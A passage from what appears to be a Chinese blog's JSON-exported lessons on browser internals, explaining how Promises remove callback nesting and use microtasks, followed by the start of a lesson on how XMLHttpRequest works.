class=\"line\">})</span><br></pre></td></tr></tbody></table></figure>\n\n<p>你可以观察上面这两段代码，重点关注下 Promise 的使用方式。</p>\n<ul>\n<li>首先我们引入了 Promise，在调用 XFetch 时，会返回一个 Promise 对象。</li>\n<li>构建 Promise 对象时，需要传入一个 executor 函数，XFetch 的主要业务流程都在 executor 函数中执行。</li>\n<li>如果运行在 excutor 函数中的业务执行成功了，会调用 resolve 函数；如果执行失败了，则调用 reject 函数。</li>\n<li>在 excutor 函数中调用 resolve 函数时，会触发 promise.then 设置的回调函数；而调用 reject 函数时，会触发 promise.catch 设置的回调函数。<br>以上简单介绍了 Promise 一些主要的使用方法，通过引入 Promise，上面这段代码看起来就非常线性了，也非常符合人的直觉，是不是很酷？基于这段代码，我们就可以来分析 Promise 是如何消灭嵌套回调和合并多个错误处理了。</li>\n</ul>\n<p>我们先来看看 Promise 是怎么消灭嵌套回调的。产生嵌套函数的一个主要原因是在发起任务请求时会带上回调函数，这样当任务处理结束之后，下个任务就只能在回调函数中来处理了。</p>\n<p>Promise 主要通过下面两步解决嵌套回调问题的。</p>\n<p><strong>首先，Promise 实现了回调函数的延时绑定</strong>。回调函数的延时绑定在代码上体现就是先创建 Promise 对象 x1，通过 Promise 的构造函数 executor 来执行业务逻辑；创建好 Promise 对象 x1 之后，再使用 x1.then 来设置回调函数。示范代码如下：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//创建Promise对象x1，并在executor函数中执行业务逻辑</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">executor</span>(<span class=\"params\">resolve, reject</span>){</span><br><span class=\"line\">    <span class=\"title function_\">resolve</span>(<span class=\"number\">100</span>)</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">let</span> x1 = <span class=\"keyword\">new</span> <span class=\"title class_\">Promise</span>(executor)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//x1延迟绑定回调函数onResolve</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">onResolve</span>(<span class=\"params\">value</span>){</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(value)</span><br><span class=\"line\">}</span><br><span class=\"line\">x1.<span class=\"title function_\">then</span>(onResolve)</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<p><strong>其次，需要将回调函数 onResolve 的返回值穿透到最外层</strong>。因为我们会根据 onResolve 函数的传入值来决定创建什么类型的 Promise 任务，创建好的 Promise 对象需要返回到最外层，这样就可以摆脱嵌套循环了。你可以先看下面的代码：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/6638a8b10ea9cb1403902e8d.png\" alt=\"回调函数返回值穿透到最外层\"></p>\n<p>现在我们知道了 Promise 通过回调函数延迟绑定和回调函数返回值穿透的技术，解决了循环嵌套。</p>\n<p>那接下来我们再来看看 Promise 是怎么处理异常的，你可以回顾上篇文章思考题留的那段代码，我把这段代码也贴在文中了，如下所示：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">executor</span>(<span class=\"params\">resolve, reject</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> rand = <span class=\"title class_\">Math</span>.<span class=\"title function_\">random</span>();</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(rand)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (rand &gt; <span class=\"number\">0.5</span>)</span><br><span class=\"line\">        <span class=\"title function_\">resolve</span>()</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"title function_\">reject</span>()</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">var</span> p0 = <span class=\"keyword\">new</span> <span class=\"title class_\">Promise</span>(executor);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> p1 = p0.<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">value</span>) =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"succeed-1\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Promise</span>(executor)</span><br><span class=\"line\">})</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> p3 = p1.<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">value</span>) =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"succeed-2\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Promise</span>(executor)</span><br><span class=\"line\">})</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> p4 = p3.<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">value</span>) =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"succeed-3\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Promise</span>(executor)</span><br><span class=\"line\">})</span><br><span class=\"line\"></span><br><span class=\"line\">p4.<span class=\"title function_\">catch</span>(<span class=\"function\">(<span class=\"params\">error</span>) =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"error\"</span>)</span><br><span class=\"line\">})</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"number\">2</span>)</span><br></pre></td></tr></tbody></table></figure>\n\n<p>这段代码有四个 Promise 对象：p0～p4。无论哪个对象里面抛出异常，都可以通过最后一个对象 p4.catch 来捕获异常，通过这种方式可以将所有 Promise 对象的错误合并到一个函数来处理，这样就解决了每个任务都需要单独处理异常的问题。</p>\n<p>之所以可以使用最后一个对象来捕获所有异常，是因为 Promise 对象的错误具有 “冒泡” 性质，会一直向后传递，直到被 onReject 函数处理或 catch 语句捕获为止。具备了这样 “冒泡” 的特性后，就不需要在每个 Promise 对象中单独捕获异常了。至于 Promise 错误的 “冒泡” 性质是怎么实现的，就留给你课后思考了。</p>\n<p>通过这种方式，我们就消灭了嵌套调用和频繁的错误处理，这样使得我们写出来的代码更加优雅，更加符合人的线性思维。</p>\n<h2 id=\"Promise与微任务\"><a href=\"#Promise与微任务\" class=\"headerlink\" title=\"Promise与微任务\"></a>Promise 与微任务</h2><p>讲了这么多，我们似乎还没有将微任务和 Promise 关联起来，那么 Promise 和微任务的关系到底体现哪里呢？</p>\n<p>我们可以结合下面这个简单的 Promise 代码来回答这个问题</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">executor</span>(<span class=\"params\">resolve, reject</span>) {</span><br><span class=\"line\">    <span class=\"title function_\">resolve</span>(<span class=\"number\">100</span>)</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">let</span> demo = <span class=\"keyword\">new</span> <span class=\"title class_\">Promise</span>(executor)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">onResolve</span>(<span class=\"params\">value</span>){</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(value)</span><br><span class=\"line\">}</span><br><span class=\"line\">demo.<span class=\"title function_\">then</span>(onResolve)</span><br></pre></td></tr></tbody></table></figure>\n\n<p>对于上面这段代码，我们需要重点关注下它的执行顺序。</p>\n<p>首先执行 new Promise 时，Promise 的构造函数会被执行，不过由于 Promise 是 V8 引擎提供的，所以暂时看不到 Promise 构造函数的细节。</p>\n<p>接下来，Promise 的构造函数会调用 Promise 的参数 executor 函数。然后在 executor 中执行了 resolve，resolve 函数也是在 V8 内部实现的，那么 resolve 函数到底做了什么呢？我们知道，执行 resolve 函数，会触发 demo.then 设置的回调函数 onResolve，所以可以推测，resolve 函数内部调用了通过 demo.then 设置的 onResolve 函数。</p>\n<p>不过这里需要注意一下，由于 Promise 采用了回调函数延迟绑定技术，所以在执行 resolve 函数的时候，回调函数还没有绑定，那么只能推迟回调函数的执行。</p>\n<p>这样按顺序陈述可能把你绕晕了，下面来模拟实现一个 Promise，我们会实现它的构造函数、resolve 方法以及 then 方法，以方便你能看清楚 Promise 的背后都发生了什么。这里我们就把这个对象称为 Bromise，下面就是 Bromise 的实现代码：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">Bromise</span>(<span class=\"params\">executor</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">var</span> onResolve_ = <span class=\"literal\">null</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> onReject_ = <span class=\"literal\">null</span></span><br><span class=\"line\">     <span class=\"comment\">//模拟实现resolve和then，暂不支持rejcet</span></span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">then</span> = <span class=\"keyword\">function</span> (<span class=\"params\">onResolve, onReject</span>) {</span><br><span class=\"line\">        onResolve_ = onResolve</span><br><span class=\"line\">    };</span><br><span class=\"line\">    <span class=\"keyword\">function</span> <span class=\"title function_\">resolve</span>(<span class=\"params\">value</span>) {</span><br><span class=\"line\">          <span class=\"comment\">//setTimeout(()=&gt;{</span></span><br><span class=\"line\">            <span class=\"title function_\">onResolve_</span>(value)</span><br><span class=\"line\">           <span class=\"comment\">// },0)</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"title function_\">executor</span>(resolve, <span class=\"literal\">null</span>);</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<p>观察上面这段代码，我们实现了自己的构造函数、resolve、then 方法。接下来我们使用 Bromise 来实现我们的业务代码，实现后的代码如下所示：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">executor</span>(<span class=\"params\">resolve, reject</span>) {</span><br><span class=\"line\">    <span class=\"title function_\">resolve</span>(<span class=\"number\">100</span>)</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">//将Promise改成我们自己的Bromsie</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> demo = <span class=\"keyword\">new</span> <span class=\"title class_\">Bromise</span>(executor)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">onResolve</span>(<span class=\"params\">value</span>){</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(value)</span><br><span class=\"line\">}</span><br><span class=\"line\">demo.<span class=\"title function_\">then</span>(onResolve)</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<p>执行这段代码，我们发现执行出错，输出的内容是</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">Uncaught TypeError: onResolve_ is not a function</span><br><span class=\"line\">    at resolve (&lt;anonymous&gt;:10:13)</span><br><span class=\"line\">    at executor (&lt;anonymous&gt;:17:5)</span><br><span class=\"line\">    at new Bromise (&lt;anonymous&gt;:13:5)</span><br><span class=\"line\">    at &lt;anonymous&gt;:19:12</span><br></pre></td></tr></tbody></table></figure>\n\n<p>之所以出现这个错误，是由于 Bromise 的延迟绑定导致的，在调用到 onResolve_函数的时候，Bromise.then 还没有执行，所以执行上述代码的时候，当然会报 “onResolve_ is not a function“的错误了。</p>\n<p>也正是因为此，我们要改造 Bromise 中的 resolve 方法，让 resolve 延迟调用 onResolve_。</p>\n<p>要让 resolve 中的 onResolve_函数延后执行，可以在 resolve 函数里面加上一个定时器，让其延时执行 onResolve_函数，你可以参考下面改造后的代码：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">function resolve(value) {</span><br><span class=\"line\">    setTimeout(()=&gt;{</span><br><span class=\"line\">        onResolve_(value)</span><br><span class=\"line\">    },0)</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<p>上面采用了定时器来推迟 onResolve 的执行，不过使用定时器的效率并不是太高，好在我们有微任务，所以 Promise 又把这个定时器改造成了微任务了，这样既可以让 onResolve_延时被调用，又提升了代码的执行效率。这就是 Promise 中使用微任务的原由了。详细的 Promise 实现可以参考<a href=\"/javascript/promise.html\">这篇文章</a>。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>好了，今天我们就聊到这里，下面我来总结下今天所讲的内容。</p>\n<p>首先，我们回顾了 Web 页面是单线程架构模型，这种模型决定了我们编写代码的形式 —— 异步编程。基于异步编程模型写出来的代码会把一些关键的逻辑点打乱，所以这种风格的代码不符合人的线性思维方式。接下来我们试着把一些不必要的回调接口封装起来，简单封装取得了一定的效果，不过，在稍微复制点的场景下依然存在着回调地狱的问题。然后我们分析了产生回调地狱的原因：</p>\n<ol>\n<li>多层嵌套的问题；</li>\n<li>每种任务的处理结果存在两种可能性（成功或失败），那么需要在每种任务执行结束后分别处理这两种可能性。<br>Promise 通过回调函数延迟绑定、回调函数返回值穿透和错误 “冒泡” 技术解决了上面的两个问题。</li>\n</ol>\n<p>最后，我们还分析了 Promise 之所以要使用微任务是由 Promise 回调函数延迟绑定技术导致的。</p>\n<h2 id=\"课外作业\"><a href=\"#课外作业\" class=\"headerlink\" title=\"课外作业\"></a>课外作业</h2><p>终于把 Promise 讲完了，这一篇文章非常有难度，所以需要你课后慢慢消消化，再次提醒，Promise 非常重要。那么今天我给你留三个思考题：</p>\n<ol>\n<li>Promise 中为什么要引入微任务？</li>\n<li>Promise 中是如何实现回调函数返回值穿透的？</li>\n<li>Promise 出错后，是怎么通过 “冒泡” 传递给最后那个捕获异常的函数？<br>这三个问题你不用急着完成，可以先花一段时间查阅材料，然后再来一道一道解释。搞清楚了这三道题目，你也就搞清楚了 Promise。</li>\n</ol>\n"},{"title":"WebAPI：XMLHttpRequest 是怎么实现的？","url":"/browser/pageEventLoop/XMLHttpRequest.html","content":"<p>自从网页中引入了 JavaScript，我们就可以操作 DOM 树中任意一个节点，例如隐藏 / 显示节点、改变颜色、获得或改变文本内容、为元素添加事件响应函数等等， 几乎可以 “为所欲为” 了。</p>\n<p>不过在 XMLHttpRequest 出现之前，如果服务器数据有更新，依然需要重新刷新整个页面。而 XMLHttpRequest 提供了从 Web 服务器获取数据的能力，如果你想要更新某条数据，只需要通过 XMLHttpRequest 请求服务器提供的接口，就可以获取到服务器的数据，然后再操作 DOM 来更新页面内容，整个过程只需要更新网页的一部分就可以了，而不用像之前那样还得刷新整个页面，这样既有效率又不会打扰到用户。</p>\n<p>关于 XMLHttpRequest，本来我是想一带而过的，后来发现这个 WebAPI 用于教学非常好。首先前面讲了那么网络内容，现在可以通过它把 HTTP 协议实践一遍；其次，XMLHttpRequest 是一个非常典型的 WebAPI，通过它来讲解浏览器是如何实现 WebAPI 的很合适，这对于你理解其他 WebAPI 也有非常大的帮助，同时在这个过程中我们还可以把一些安全问题给串起来。</p>\n<p>但在深入讲解 XMLHttpRequest 之前，我们得先介绍下<strong>同步回调</strong>和<strong>异步回调</strong>这两个概念，这会帮助你更加深刻地理解 WebAPI 是怎么工作的。</p>\n<h2 id=\"回调函数-VS-系统调用栈\"><a href=\"#回调函数-VS-系统调用栈\" class=\"headerlink\" title=\"回调函数 VS 系统调用栈\"></a>回调函数 VS 系统调用栈</h2><p>那什么是回调函数呢（Callback Function）？</p>\n<p>将一个函数作为参数传递给另外一个函数，那作为参数的这个函数就是回调函数。简化的代码如下所示：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> callback = <span class=\"keyword\">function</span>(<span class=\"params\"></span>){</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'i am do homework'</span>)</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">doWork</span>(<span class=\"params\">cb</span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'start do work'</span>)</span><br><span class=\"line\">    <span class=\"title function_\">cb</span>()</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'end do work'</span>)</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"title function_\">doWork</span>(callback)</span><br></pre></td></tr></tbody></table></figure>\n\n<p>在上面示例代码中，我们将一个匿名函数赋值给变量 callback，同时将 callback 作为参数传递给了 doWork () 函数，这时在函数 doWork () 中 callback 就是回调函数。</p>\n<p>上面的回调方法有个特点，就是回调函数 callback 是在主函数 doWork 返回之前执行的，我们把这个回调过程称为同步回调。</p>\n<p>既然有同步回调，那肯定也有异步回调。下面我们再来看看异步回调的例子：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> callback = <span class=\"keyword\">function</span>(<span class=\"params\"></span>){</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'i am do homework'</span>)</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">doWork</span>(<span class=\"params\">cb</span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'start do work'</span>)</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(cb,<span class=\"number\">1000</span>)   </span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'end do work'</span>)</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"title function_\">doWork</span>(callback)</span><br></pre></td></tr></tbody></table></figure>\n\n<p>在这个例子中，我们使用了 setTimeout 函数让 callback 在 doWork 函数执行结束后，又延时了 1 秒再执行，这次 callback 并没有在主函数 doWork 内部被调用，我们把这种回调函数在主函数外部执行的过程称为<strong>异步回调</strong>。</p>\n<p>现在你应该知道什么是同步回调和异步回调了，那下面我们再深入点，站在消息循环的视角来看看同步回调和异步回调的区别。理解了这些，可以让你从本质上理解什么是回调。</p>\n<p>这里还需要补充一点，那就是当循环系统在执行一个任务的时候，都要为这个任务维护一个系统调用栈。这个系统调用栈类似于 JavaScript 的调用栈，只不过系统调用栈是 Chromium 的开发语言 C++ 来维护的，其完整的调用栈信息你可以通过 chrome://tracing/ 来抓取。当然，你也可以通过 Performance 来抓取它核心的调用信息，如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663889a60ea9cb1403485868.png\" alt=\"消息循环系统调用栈记录\"></p>\n<p>这幅图记录了一个 Parse HTML 的任务执行过程，其中黄色的条目表示执行 JavaScript 的过程，其他颜色的条目表示浏览器内部系统的执行过程。</p>\n<p>通过该图你可以看出来，Parse HTML 任务在执行过程中会遇到一系列的子过程，比如在解析页面的过程中遇到了 JavaScript 脚本，那么就暂停解析过程去执行该脚本，等执行完成之后，再恢复解析过程。然后又遇到了样式表，这时候又开始解析样式表…… 直到整个任务执行完成。</p>\n<p>需要说明的是，整个 Parse HTML 是一个完整的任务，在执行过程中的脚本解析、样式表解析都是该任务的子过程，其下拉的长条就是执行过程中调用栈的信息。</p>\n<p>每个任务在执行过程中都有自己的调用栈，那么同步回调就是在当前主函数的上下文中执行回调函数，这个没有太多可讲的。下面我们主要来看看异步回调过程，异步回调是指回调函数在主函数之外执行，一般有两种方式：</p>\n<ul>\n<li>第一种是把异步函数做成一个任务，添加到信息队列尾部；</li>\n<li>第二种是把异步函数添加到微任务队列中，这样就可以在当前任务的末尾处执行微任务了。</li>\n</ul>\n<h2 id=\"XMLHttpRequest运作机制\"><a href=\"#XMLHttpRequest运作机制\" class=\"headerlink\" title=\"XMLHttpRequest运作机制\"></a>XMLHttpRequest 运作机制</h2><p>理解了什么是同步回调和异步回调，接下来我们就来分析 XMLHttpRequest 背后的实现机制，具体工作过程你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663889df0ea9cb140348ca43.png\" alt=\"XMLHttpRequest工作流程图\"></p>\n<p>这是 XMLHttpRequest 的总执行流程图，下面我们就来分析从发起请求到接收数据的完整流程。</p>\n<p>我们先从 XMLHttpRequest 的用法开始，首先看下面这样一段请求代码：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"> <span class=\"keyword\">function</span> <span class=\"title function_\">GetWebData</span>(<span class=\"params\">URL</span>){</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 1:新建XMLHttpRequest请求对象</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> xhr = <span class=\"keyword\">new</span> <span class=\"title class_\">XMLHttpRequest</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 2:注册相关事件回调处理函数 </span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    xhr.<span class=\"property\">onreadystatechange</span> = <span class=\"keyword\">function</span> (<span class=\"params\"></span>) {</span><br><span class=\"line\">        <span class=\"keyword\">switch</span>(xhr.<span class=\"property\">readyState</span>){</span><br><span class=\"line\">          <span class=\"keyword\">case</span> <span class=\"number\">0</span>: <span class=\"comment\">//请求未初始化</span></span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"请求未初始化\"</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">          <span class=\"keyword\">case</span> <span class=\"number\">1</span>:<span class=\"comment\">//OPENED</span></span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"OPENED\"</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">          <span class=\"keyword\">case</span> <span class=\"number\">2</span>:<span class=\"comment\">//HEADERS_RECEIVED</span></span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"HEADERS_RECEIVED\"</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">          <span class=\"keyword\">case</span> <span class=\"number\">3</span>:<span class=\"comment\">//LOADING  </span></span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"LOADING\"</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">          <span class=\"keyword\">case</span> <span class=\"number\">4</span>:<span class=\"comment\">//DONE</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">status</span> == <span class=\"number\">200</span>||<span class=\"variable language_\">this</span>.<span class=\"property\">status</span> == <span class=\"number\">304</span>){</span><br><span class=\"line\">                <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">responseText</span>);</span><br><span class=\"line\">                }</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"DONE\"</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    xhr.<span class=\"property\">ontimeout</span> = <span class=\"keyword\">function</span>(<span class=\"params\">e</span>) { <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'ontimeout'</span>) }</span><br><span class=\"line\">    xhr.<span class=\"property\">onerror</span> = <span class=\"keyword\">function</span>(<span class=\"params\">e</span>) { <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'onerror'</span>) }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 3:打开请求</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    xhr.<span class=\"title function_\">open</span>(<span class=\"string\">'Get'</span>, <span class=\"variable constant_\">URL</span>, <span class=\"literal\">true</span>);<span class=\"comment\">//创建一个Get请求,采用异步</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 4:配置参数</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    xhr.<span class=\"property\">timeout</span> = <span class=\"number\">3000</span> <span class=\"comment\">//设置xhr请求的超时时间</span></span><br><span class=\"line\">    xhr.<span class=\"property\">responseType</span> = <span class=\"string\">\"text\"</span> <span class=\"comment\">//设置响应返回的数据格式</span></span><br><span class=\"line\">    xhr.<span class=\"title function_\">setRequestHeader</span>(<span class=\"string\">\"X_TEST\"</span>,<span class=\"string\">\"time.geekbang\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 5:发送请求</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    xhr.<span class=\"title function_\">send</span>();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<p>上面是一段利用了 XMLHttpRequest 来请求数据的代码，再结合上面的流程图，我们可以分析下这段代码是怎么执行的。</p>\n<p><strong>第一步：创建 XMLHttpRequest 对象</strong>。</p>\n<p>当执行到 let xhr = new XMLHttpRequest () 后，JavaScript 会创建一个 XMLHttpRequest 对象 xhr，用来执行实际的网络请求操作。</p>\n<p><strong>第二步：为 xhr 对象注册回调函数</strong>。</p>\n<p>因为网络请求比较耗时，所以要注册回调函数，这样后台任务执行完成之后就会通过调用回调函数来告诉其执行结果。</p>\n<p>XMLHttpRequest 的回调函数主要有下面几种：</p>\n<ul>\n<li>ontimeout，用来监控超时请求，如果后台请求超时了，该函数会被调用；</li>\n<li>onerror，用来监控出错信息，如果后台请求出错了，该函数会被调用；</li>\n<li>onreadystatechange，用来监控后台请求过程中的状态，比如可以监控到 HTTP 头加载完成的消息、HTTP 响应体消息以及数据加载完成的消息等。</li>\n</ul>\n<p><strong>第三步：配置基础的请求信息</strong>。</p>\n<p>注册好回调事件之后，接下来就需要配置基础的请求信息了，首先要通过 open 接口配置一些基础的请求信息，包括请求的地址、请求方法（是 get 还是 post）和请求方式（同步还是异步请求）。</p>\n<p>然后通过 xhr 内部属性类配置一些其他可选的请求信息，你可以参考文中示例代码，我们通过 xhr.timeout = 3000 来配置超时时间，也就是说如果请求超过 3000 毫秒还没有响应，那么这次请求就被判断为失败了。</p>\n<p>我们还可以通过 xhr.responseType = “text” 来配置服务器返回的格式，将服务器返回的数据自动转换为自己想要的格式，如果将 responseType 的值设置为 json，那么系统会自动将服务器返回的数据转换为 JavaScript 对象格式。下面的图表是我列出的一些返回类型的描述：</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">类型</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"> “”</td>\n<td> 将 responseType 设 空字符串，与设置力”text” 相同，是默认类型（UTF-16 字符串）。</td>\n</tr>\n<tr>\n<td align=\"left\">“text”</td>\n<td> 返回的是 UTF-16 字符串文本。</td>\n</tr>\n<tr>\n<td align=\"left\">“json”</td>\n<td>response 是一个 JavaScript 对象。</td>\n</tr>\n<tr>\n<td align=\"left\">“document”</td>\n<td>response 是一个 DOM 对象。</td>\n</tr>\n<tr>\n<td align=\"left\">“blob”</td>\n<td>response 是一个包含二进制数据的 Blob 对象。</td>\n</tr>\n<tr>\n<td align=\"left\">“arraybuffer”</td>\n<td>response 是一个包含二进制数据的 JavaScript ArrayBuffer。</td>\n</tr>\n</tbody></table>\n<p>假如你还需要添加自己专用的请求头属性，可以通过 xhr.setRequestHeader 来添加。</p>\n<p><strong>第四步：发起请求</strong>。</p>\n<p>一切准备就绪之后，就可以调用 <code>xhr.send</code> 来发起网络请求了。你可以对照上面那张请求流程图，可以看到：渲染进程会将请求发送给网络进程，然后网络进程负责资源的下载，等网络进程接收到数据之后，就会利用 IPC 来通知渲染进程；渲染进程接收到消息之后，会将 xhr 的回调函数封装成任务并添加到消息队列中，等主线程循环系统执行到该任务的时候，就会根据相关的状态来调用对应的回调函数。</p>\n<ul>\n<li>如果网络请求出错了，就会执行 <code>xhr.onerror</code>；</li>\n<li>如果超时了，就会执行 <code>xhr.ontimeout</code>；</li>\n<li>如果是正常的数据接收，就会执行 <code>onreadystatechange</code> 来反馈相应的状态。<br>这就是一个完整的 XMLHttpRequest 请求流程，如果你感兴趣，可以参考下 Chromium 对 XMLHttpRequest 的实现，<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3lvYXZ3ZWlzcy9CbGluay9ibG9iL21hc3Rlci9Tb3VyY2UvY29yZS94bWwvWE1MSHR0cFJlcXVlc3QuY3Bw\">点击这里查看代码<i class=\"fa fa-external-link-alt\"></i></span>。</li>\n</ul>\n<h2 